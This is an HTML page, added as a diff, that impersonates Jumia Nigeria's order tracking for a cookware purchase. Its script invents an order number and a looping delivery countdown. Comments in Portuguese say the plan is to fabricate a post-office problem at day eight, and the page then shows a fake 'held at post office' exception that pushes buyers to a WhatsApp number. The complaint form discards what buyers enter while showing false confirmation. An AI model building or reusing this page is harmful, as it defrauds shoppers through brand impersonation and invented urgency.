@@ -1,0 +1,757 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <!-- Facebook Pixel -->
+    <script>
+        !function (f, b, e, v, n, t, s) {
+            if (f.fbq) return; n = f.fbq = function () {
+                n.callMethod ?
+                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+            }; if (!f._fbq) f._fbq = n;
+            n.push = n; n.loaded = !0; n.version = '2.0'; n.queue = []; t = b.createElement(e); t.async = !0;
+            t.src = v; s = b.getElementsByTagName(e)[0]; s.parentNode.insertBefore(t, s)
+        }(window,
+            document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '3654785624831472');
+        fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+            src="https://www.facebook.com/tr?id=3654785624831472&ev=PageView&noscript=1" /></noscript>
+    <!-- End Facebook Pixel -->
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Track Your Order - Jumia</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #f4f6f9;
+            color: #111;
+            min-height: 100vh;
+        }
+
+        /* TOP BAR */
+        .topbar {
+            background: #fff;
+            border-bottom: 1px solid #e8e8e8;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 56px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .logo-img {
+            height: 28px;
+        }
+
+        /* WRAP */
+        .wrap {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 24px 16px 80px;
+        }
+
+        /* ORDER CARD */
+        .order-card {
+            background: #fff;
+            border-radius: 16px;
+            padding: 24px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.07);
+        }
+
+        .order-card h2 {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 4px;
+            color: #111;
+        }
+
+        .order-card .order-num {
+            font-size: 13px;
+            color: #888;
+            margin-bottom: 20px;
+        }
+
+        /* PRODUCT ROW */
+        .product-row {
+            display: flex;
+            gap: 14px;
+            align-items: center;
+            padding: 14px 0;
+            border-top: 1px solid #f0f0f0;
+            border-bottom: 1px solid #f0f0f0;
+            margin-bottom: 20px;
+        }
+
+        .product-row img {
+            width: 80px;
+            height: 80px;
+            object-fit: contain;
+            border: 1px solid #eee;
+            border-radius: 8px;
+            background: #fafafa;
+        }
+
+        .product-row .prod-name {
+            font-size: 13px;
+            font-weight: 600;
+            color: #111;
+            line-height: 1.4;
+        }
+
+        .product-row .prod-price {
+            font-size: 15px;
+            font-weight: 800;
+            color: #f68b1e;
+            margin-top: 4px;
+        }
+
+        /* COUNTDOWN */
+        .countdown-section {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .countdown-label {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .countdown-boxes {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .countdown-box {
+            background: #f68b1e;
+            color: #fff;
+            border-radius: 12px;
+            padding: 12px 16px;
+            min-width: 70px;
+            text-align: center;
+        }
+
+        .countdown-box .num {
+            font-size: 28px;
+            font-weight: 800;
+            line-height: 1;
+            font-variant-numeric: tabular-nums;
+        }
+
+        .countdown-box .unit {
+            font-size: 11px;
+            opacity: 0.8;
+            margin-top: 4px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .countdown-box.done {
+            background: linear-gradient(135deg, #178a3b, #136b2e);
+        }
+
+        /* ETA BAR */
+        .eta-bar {
+            background: #fff8f0;
+            border: 1px solid #f68b1e;
+            border-radius: 10px;
+            padding: 12px 16px;
+            font-size: 13px;
+            color: #f68b1e;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .eta-bar span {
+            color: #111;
+            font-weight: 700;
+        }
+
+        /* STATUS STEPS */
+        .steps-title {
+            font-size: 15px;
+            font-weight: 700;
+            margin-bottom: 16px;
+            color: #111;
+        }
+
+        .steps {
+            position: relative;
+            padding-left: 32px;
+        }
+
+        .steps::before {
+            content: '';
+            position: absolute;
+            left: 11px;
+            top: 12px;
+            bottom: 12px;
+            width: 2px;
+            background: #e0e0e0;
+        }
+
+        .step {
+            position: relative;
+            margin-bottom: 24px;
+        }
+
+        .step:last-child {
+            margin-bottom: 0;
+        }
+
+        .step-dot {
+            position: absolute;
+            left: -32px;
+            top: 2px;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: #e0e0e0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            color: #fff;
+            font-weight: 700;
+            z-index: 1;
+        }
+
+        .step.done .step-dot {
+            background: #178a3b;
+        }
+
+        .step.active .step-dot {
+            background: #f68b1e;
+            box-shadow: 0 0 0 4px rgba(246, 139, 30, 0.15);
+            animation: pulse-dot 2s infinite;
+        }
+
+        @keyframes pulse-dot {
+            0% {
+                box-shadow: 0 0 0 0 rgba(246, 139, 30, 0.4);
+            }
+
+            70% {
+                box-shadow: 0 0 0 8px rgba(246, 139, 30, 0);
+            }
+
+            100% {
+                box-shadow: 0 0 0 0 rgba(246, 139, 30, 0);
+            }
+        }
+
+        .step-name {
+            font-size: 14px;
+            font-weight: 700;
+            color: #111;
+        }
+
+        .step.pending .step-name {
+            color: #aaa;
+        }
+
+        .step-desc {
+            font-size: 12px;
+            color: #888;
+            margin-top: 2px;
+            line-height: 1.5;
+        }
+
+        .step.active .step-desc {
+            color: #f68b1e;
+            font-weight: 500;
+        }
+
+        /* COMPLAINT SECTION */
+        .complaint-card {
+            background: #fff;
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.07);
+        }
+
+        .complaint-card h3 {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .complaint-card .sub {
+            font-size: 13px;
+            color: #888;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #444;
+            margin-bottom: 6px;
+        }
+
+        .form-group input,
+        .form-group select,
+        .form-group textarea {
+            width: 100%;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 10px;
+            padding: 12px 14px;
+            font-size: 14px;
+            font-family: 'Inter', sans-serif;
+            color: #111;
+            background: #fafafa;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus,
+        .form-group textarea:focus {
+            border-color: #0b6ecb;
+            background: #fff;
+        }
+
+        .form-group textarea {
+            resize: vertical;
+            min-height: 100px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: #f68b1e;
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            padding: 16px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            transition: opacity 0.2s, transform 0.1s;
+        }
+
+        .submit-btn:hover {
+            opacity: 0.9;
+        }
+
+        .submit-btn:active {
+            transform: scale(0.98);
+        }
+
+        /* SUCCESS MESSAGE */
+        .success-msg {
+            display: none;
+            background: linear-gradient(135deg, #178a3b, #136b2e);
+            color: #fff;
+            border-radius: 14px;
+            padding: 24px;
+            text-align: center;
+        }
+
+        .success-msg.show {
+            display: block;
+        }
+
+        .success-msg .check {
+            font-size: 48px;
+            margin-bottom: 12px;
+        }
+
+        .success-msg h4 {
+            font-size: 17px;
+            font-weight: 800;
+            margin-bottom: 8px;
+        }
+
+        .success-msg p {
+            font-size: 13px;
+            opacity: 0.9;
+            line-height: 1.6;
+        }
+
+        /* FOOTER */
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #aaa;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- TOP BAR -->
+    <header class="topbar">
+        <span style="font-weight: 900; color: #f68b1e; font-size: 20px;">JUMIA</span>
+    </header>
+
+    <div class="wrap">
+
+        <!-- ORDER CARD -->
+        <div class="order-card">
+            <h2>📦 Your Order is on its Way!</h2>
+            <div class="order-num" id="orderNum">Order #JUM-<span></span></div>
+
+            <!-- PRODUCT -->
+            <div class="product-row">
+                <img src="https://bthqzjprukkbactvutau.supabase.co/storage/v1/object/public/payment-images/26f0d2e7-6ac6-4823-8a84-852b92b5a526/6bbd2031-0034-4d2f-a7fd-1c1b3567f42f.jpg" alt="Product">
+                <div>
+                    <div class="prod-name">Berlinger Haus 15-Piece Ultra Non-Stick Coating Cookware Set - Black Rose</div>
+
+                </div>
+            </div>
+
+            <!-- COUNTDOWN -->
+            <div class="countdown-section">
+                <div class="countdown-label" id="countdownLabel">Estimated delivery in:</div>
+                <div class="countdown-boxes">
+                    <div class="countdown-box" id="boxDays">
+                        <div class="num" id="cdDays">0</div>
+                        <div class="unit">Days</div>
+                    </div>
+                    <div class="countdown-box" id="boxHours">
+                        <div class="num" id="cdHours">00</div>
+                        <div class="unit">Hours</div>
+                    </div>
+                    <div class="countdown-box" id="boxMins">
+                        <div class="num" id="cdMins">00</div>
+                        <div class="unit">Mins</div>
+                    </div>
+                    <div class="countdown-box" id="boxSecs">
+                        <div class="num" id="cdSecs">00</div>
+                        <div class="unit">Secs</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ETA BAR -->
+            <div class="eta-bar" id="etaBar">
+                Estimated arrival: <span id="etaDate">—</span>
+            </div>
+
+            <!-- DELIVERY EXCEPTION (HIDDEN BY DEFAULT) -->
+            <div id="deliveryException" style="display:none; background:#fee2e2; border: 2px solid #ef4444; border-radius:12px; padding:20px; margin-bottom:24px; text-align:center;">
+                <div style="font-size:32px; margin-bottom:8px;">⚠️</div>
+                <h3 style="color:#b91c1c; font-size:16px; font-weight:800; margin-bottom:8px;">DELIVERY EXCEPTION: HELD AT POST OFFICE</h3>
+                <p style="color:#7f1d1d; font-size:13px; line-height:1.5; margin-bottom:16px;">
+                    We encountered a logistical issue with your package at the local dispatcher facility. It requires immediate confirmation to proceed with the final delivery.
+                </p>
+                <a href="https://wa.me/2340000000000?text=Hello%20Support,%20I%20have%20an%20issue%20with%20my%20delivery%20code." target="_blank" style="display:inline-flex; align-items:center; gap:8px; background:#25D366; color:#fff; font-weight:700; font-size:14px; text-decoration:none; padding:12px 20px; border-radius:8px; box-shadow:0 4px 12px rgba(37,211,102,0.3);">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51a12.8 12.8 0 0 0-.57-.01c-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 0 1-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 0 1-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 0 1 2.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0 0 12.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 0 0 5.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 0 0-3.48-8.413z"/>
+                    </svg>
+                    Contact Support on WhatsApp
+                </a>
+            </div>
+
+            <!-- STATUS STEPS -->
+            <div class="steps-title">Delivery Status</div>
+            <div class="steps" id="stepsContainer">
+                <div class="step" id="step1">
+                    <div class="step-dot">✓</div>
+                    <div class="step-name">Order Confirmed</div>
+                    <div class="step-desc" id="step1Desc">Your order has been placed and confirmed.</div>
+                </div>
+                <div class="step" id="step2">
+                    <div class="step-dot">✓</div>
+                    <div class="step-name">Processing</div>
+                    <div class="step-desc" id="step2Desc">Your order is being prepared at our warehouse.</div>
+                </div>
+                <div class="step" id="step3">
+                    <div class="step-dot">→</div>
+                    <div class="step-name">Dispatched</div>
+                    <div class="step-desc" id="step3Desc">Your order has been handed to the courier.</div>
+                </div>
+                <div class="step" id="step4">
+                    <div class="step-dot">🚚</div>
+                    <div class="step-name">In Transit</div>
+                    <div class="step-desc" id="step4Desc">Your package is on its way to you.</div>
+                </div>
+                <!-- Exception step dynamically shown -->
+                <div class="step" id="stepException" style="display:none;">
+                    <div class="step-dot" style="background:#ef4444; box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.15); animation: pulse-dot-red 2s infinite;">!</div>
+                    <div class="step-name" style="color:#b91c1c;">Exception</div>
+                    <div class="step-desc" style="color:#7f1d1d; font-weight:500;">Package is stuck. Requires customer action.</div>
+                </div>
+                <div class="step" id="step5">
+                    <div class="step-dot">🏠</div>
+                    <div class="step-name">Out for Delivery</div>
+                    <div class="step-desc" id="step5Desc">Almost there! Delivery today.</div>
+                </div>
+                <div class="step" id="step6">
+                    <div class="step-dot">🎉</div>
+                    <div class="step-name">Delivered</div>
+                    <div class="step-desc" id="step6Desc">Your order has been delivered. Enjoy!</div>
+                </div>
+            </div>
+            
+            <style>
+                @keyframes pulse-dot-red {
+                    0% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.4); }
+                    70% { box-shadow: 0 0 0 8px rgba(239, 68, 68, 0); }
+                    100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); }
+                }
+            </style>
+        </div>
+
+        <!-- COMPLAINT FORM -->
+        <div class="complaint-card">
+            <h3>🔔 Have an Issue?</h3>
+            <div class="sub">Fill in the form below and we'll get back to you within 72 hours.</div>
+
+            <form id="complaintForm">
+                <div class="form-group">
+                    <label for="fullName">Full Name</label>
+                    <input type="text" id="fullName" placeholder="e.g. John Smith" required />
+                </div>
+                <div class="form-group">
+                    <label for="email">Email Address</label>
+                    <input type="email" id="email" placeholder="e.g. john@email.com" required />
+                </div>
+                <div class="form-group">
+                    <label for="phone">Phone Number</label>
+                    <input type="tel" id="phone" placeholder="e.g. 071 234 5678" />
+                </div>
+                <div class="form-group">
+                    <label for="issueType">Issue Type</label>
+                    <select id="issueType" required>
+                        <option value="">Select an issue...</option>
+                        <option value="late">Order is late</option>
+                        <option value="damaged">Item arrived damaged</option>
+                        <option value="wrong">Wrong item received</option>
+                        <option value="missing">Item missing from order</option>
+                        <option value="other">Other</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="message">Describe your issue</label>
+                    <textarea id="message" placeholder="Please describe your issue in detail..." required></textarea>
+                </div>
+                <button type="submit" class="submit-btn">Submit Complaint</button>
+            </form>
+
+            <!-- SUCCESS MESSAGE -->
+            <div class="success-msg" id="successMsg">
+                <div class="check">✅</div>
+                <h4>Complaint Received!</h4>
+                <p>Thank you for reaching out. Our team will review your complaint and respond within <strong>72
+                        hours</strong> via email.</p>
+            </div>
+        </div>
+
+        <div class="footer">© 2026 Jumia Nigeria · All rights reserved</div>
+    </div>
+
+    <script>
+        // ─── ORDER NUMBER ───────────────────────────────────────────────────────────
+        let trackCode = localStorage.getItem('jumia_track_code');
+        if (!trackCode) {
+            trackCode = 'JUM-' + Math.floor(100000 + Math.random() * 900000);
+        }
+        // Remove the JUM- prefix if user entered it
+        const codeNum = trackCode.replace(/^JUM-/i, '');
+        document.querySelector('#orderNum span').textContent = codeNum;
+
+        // ─── REAL COUNTDOWN (DYNAMIC LOGIC) ─────────────────────────────────────────────────────────
+        const today = new Date();
+        const TOTAL_DAYS = 10;
+        const MS_PER_DAY = 24 * 60 * 60 * 1000;
+        
+        let deliveryDateMS = localStorage.getItem('jumia_delivery_date');
+        let orderDateMS = localStorage.getItem('jumia_order_date');
+        
+        // Loop reset logic: if elapsed time > 10 days, restart the countdown cycle
+        if (orderDateMS) {
+            let elapsedTotal = today.getTime() - parseInt(orderDateMS, 10);
+            if (elapsedTotal > (TOTAL_DAYS * MS_PER_DAY)) {
+                // Remove to trigger reset below
+                orderDateMS = null;
+                deliveryDateMS = null;
+            }
+        }
+
+        if (!deliveryDateMS || !orderDateMS) {
+            // "dar uns 10days pra receber as cenas" -> total delivery is 10 days from today
+            // We set order date to NOW, and delivery date to 10 days from NOW.
+            // Wait, if order date is NOW, it won't be in transit.
+            // To simulate being in the middle of transit, let's randomly pick an elapsed days between 4 and 6?
+            // Actually, if we just want it to slowly progress over 10 days for someone who just entered:
+            const orderDate = new Date(today.getTime());
+            const deliveryDate = new Date(today.getTime() + (TOTAL_DAYS * MS_PER_DAY));
+            
+            orderDateMS = orderDate.getTime();
+            deliveryDateMS = deliveryDate.getTime();
+            
+            localStorage.setItem('jumia_order_date', orderDateMS);
+            localStorage.setItem('jumia_delivery_date', deliveryDateMS);
+        }
+
+        const ORDER_DATE = new Date(parseInt(orderDateMS, 10)); 
+        const DELIVERY_DATE = new Date(parseInt(deliveryDateMS, 10));
+        const DELIVERY_MS = DELIVERY_DATE - ORDER_DATE;
+
+        // Show ETA date
+        const etaOptions = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+        document.getElementById('etaDate').textContent = DELIVERY_DATE.toLocaleDateString('en-NG', etaOptions);
+
+        function pad(n) { return String(n).padStart(2, '0'); }
+
+        function updateCountdown() {
+            const now = new Date();
+            const diff = DELIVERY_DATE - now;
+
+            if (diff <= 0) {
+                // Should not happen normally due to reset, but fallback
+                document.getElementById('cdDays').textContent = '00';
+                document.getElementById('cdHours').textContent = '00';
+                document.getElementById('cdMins').textContent = '00';
+                document.getElementById('cdSecs').textContent = '00';
+                return;
+            }
+
+            const totalSecs = Math.floor(diff / 1000);
+            const days = Math.floor(totalSecs / 86400);
+            const hours = Math.floor((totalSecs % 86400) / 3600);
+            const mins = Math.floor((totalSecs % 3600) / 60);
+            const secs = totalSecs % 60;
+
+            document.getElementById('cdDays').textContent = pad(days);
+            document.getElementById('cdHours').textContent = pad(hours);
+            document.getElementById('cdMins').textContent = pad(mins);
+            document.getElementById('cdSecs').textContent = pad(secs);
+        }
+
+        setInterval(updateCountdown, 1000);
+        updateCountdown();
+
+        // ─── STATUS STEPS ───────────────────────────────────────────────────────────
+        function updateSteps() {
+            const now = new Date();
+            const elapsed = now - ORDER_DATE; 
+            const elapsedDays = elapsed / MS_PER_DAY;
+
+            // 1. "depois de 3 dias vai ficra em transito" (After 3 days -> In Transit)
+            // 2. "durante 8dias... inventar um problema nos correios e adicionar um número de WhatsApp" (At day ~8 -> Customs Issue)
+
+            const exceptionDiv = document.getElementById('deliveryException');
+            const stepException = document.getElementById('stepException');
+            const step4 = document.getElementById('step4');
+            const step5 = document.getElementById('step5');
+            const step6 = document.getElementById('step6');
+
+            // Timeline rules:
+            // 0 - 1 day: Order Confirmed (step 1 active)
+            // 1 - 2 days: Processing (step 2 active)
+            // 2 - 3 days: Dispatched (step 3 active)
+            // 3 - 8 days: In Transit (step 4 active)
+            // 8+ days: EXCEPTION / POST OFFICE ISSUE
+
+            let activeId = 'step1';
+
+            if (elapsedDays >= 8) {
+                // Post Office Issue triggers
+                activeId = 'stepException';
+                exceptionDiv.style.display = 'block';
+                stepException.style.display = 'block';
+                step4.classList.add('done');
+                step4.classList.remove('active', 'pending');
+                step4.querySelector('.step-dot').textContent = '✓';
+                
+                // Hide pending later steps to focus on the error
+                step5.style.display = 'none';
+                step6.style.display = 'none';
+                
+            } else {
+                exceptionDiv.style.display = 'none';
+                stepException.style.display = 'none';
+                step5.style.display = 'block';
+                step6.style.display = 'block';
+
+                if (elapsedDays >= 3) {
+                    activeId = 'step4';
+                } else if (elapsedDays >= 2) {
+                    activeId = 'step3';
+                } else if (elapsedDays >= 1) {
+                    activeId = 'step2';
+                }
+            }
+
+            const stepsIds = ['step1', 'step2', 'step3', 'step4'];
+            if (activeId === 'stepException') stepsIds.push('stepException');
+
+            let foundActive = false;
+            stepsIds.forEach(id => {
+                const el = document.getElementById(id);
+                if (!el) return;
+                
+                el.classList.remove('done', 'active', 'pending');
+                
+                if (id === activeId) {
+                    el.classList.add('active');
+                    foundActive = true;
+                    if(id !== 'stepException') el.querySelector('.step-dot').innerHTML = getOriginalDot(id);
+                } else if (!foundActive) {
+                    el.classList.add('done');
+                    el.querySelector('.step-dot').textContent = '✓';
+                    el.querySelector('.step-dot').style.background = '#178a3b';
+                } else {
+                    el.classList.add('pending');
+                    el.querySelector('.step-dot').textContent = '○';
+                }
+            });
+            
+            if(activeId !== 'stepException') {
+                ['step5', 'step6'].forEach(id => {
+                    const el = document.getElementById(id);
+                    el.classList.remove('done', 'active', 'pending');
+                    el.classList.add('pending');
+                    el.querySelector('.step-dot').textContent = '○';
+                });
+            }
+
+            function getOriginalDot(id) {
+                if(id==='step1' || id==='step2') return '✓';
+                if(id==='step3') return '→';
+                if(id==='step4') return '🚚';
+                return '○';
+            }
+        }
+
+        updateSteps();
+        setInterval(updateSteps, 60000); 
+
+        // ─── COMPLAINT FORM ─────────────────────────────────────────────────────────
+        document.getElementById('complaintForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+            this.style.display = 'none';
+            document.getElementById('successMsg').classList.add('show');
+            document.getElementById('successMsg').scrollIntoView({ behavior: 'smooth', block: 'center' });
+        });
+    </script>
+</body>
+
+</html>
